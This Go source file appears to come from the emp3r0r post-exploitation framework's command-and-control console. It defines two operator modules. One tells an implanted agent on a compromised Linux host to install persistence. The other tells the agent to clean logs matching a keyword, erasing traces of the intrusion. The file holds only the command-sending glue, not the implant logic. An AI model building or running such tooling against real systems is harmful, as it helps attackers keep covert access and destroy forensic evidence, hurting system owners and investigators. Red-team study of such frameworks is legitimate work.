//go:build linux
// +build linux

package cc

import (
	"fmt"

	"github.com/fatih/color"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
)

func modulePersistence() {
	cmd := fmt.Sprintf("%s --method %s", emp3r0r_data.C2CmdPersistence, Options["method"].Val)
	err := SendCmd(cmd, "", CurrentTarget)
	if err != nil {
		CliPrintError("SendCmd: %v", err)
		return
	}
	color.HiMagenta("Please wait for agent's response...")
}

func moduleLogCleaner() {
	cmd := fmt.Sprintf("%s --keyword %s", emp3r0r_data.C2CmdCleanLog, Options["keyword"].Val)
	err := SendCmd(cmd, "", CurrentTarget)
	if err != nil {
		CliPrintError("SendCmd: %v", err)
		return
	}
	color.HiMagenta("Please wait for agent's response...")
}
